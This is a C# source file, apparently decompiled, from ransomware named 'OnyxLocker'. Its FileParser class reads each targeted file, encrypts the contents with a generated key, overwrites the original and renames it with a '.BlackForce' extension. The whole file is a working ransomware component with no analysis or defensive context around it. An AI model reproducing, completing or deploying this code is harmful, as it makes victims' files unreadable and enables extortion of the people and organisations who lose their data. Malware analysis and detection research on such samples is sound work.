using System;
using System.IO;

namespace OnyxLocker
{
	// Token: 0x02000004 RID: 4
	internal class FileParser : IFileParser
	{
		// Token: 0x0600000C RID: 12 RVA: 0x00002619 File Offset: 0x00000819
		public FileParser(IEncryptionProvider encryptionProvider)
		{
			this.EncryptionProvider = encryptionProvider;
			this.KeyBytes = this.EncryptionProvider.CreateEncryptionKey();
		}

		// Token: 0x0600000D RID: 13 RVA: 0x0000263C File Offset: 0x0000083C
		public void ParseFile(string filePath)
		{
			byte[] fileBytes = this.GetFileBytes(filePath);
			byte[] fileBytes2 = this.EncryptionProvider.EncryptBytes(fileBytes, this.KeyBytes);
			this.WriteFileBytes(filePath, fileBytes2);
			string extension = Path.GetExtension(filePath);
			string destFileName = filePath.Replace(extension, ".BlackForce");
			try
			{
				File.Move(filePath, destFileName);
			}
			catch
			{
			}
			GC.Collect();
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000026AC File Offset: 0x000008AC
		private byte[] GetFileBytes(string filePath)
		{
			byte[] result;
			using (FileStream fileStream = File.OpenRead(filePath))
			{
				byte[] array = new byte[fileStream.Length];
				try
				{
					fileStream.Read(array, 0, Convert.ToInt32(fileStream.Length));
					fileStream.Close();
					result = array;
				}
				finally
				{
					fileStream.Close();
				}
			}
			return result;
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002724 File Offset: 0x00000924
		private void WriteFileBytes(string filePath, byte[] fileBytes)
		{
			using (FileStream fileStream = File.OpenWrite(filePath))
			{
				bool canWrite = fileStream.CanWrite;
				if (canWrite)
				{
					fileStream.Write(fileBytes, 0, Convert.ToInt32(fileBytes.Length));
				}
			}
		}

		// Token: 0x04000004 RID: 4
		private IEncryptionProvider EncryptionProvider;

		// Token: 0x04000005 RID: 5
		private byte[] KeyBytes;
	}
}
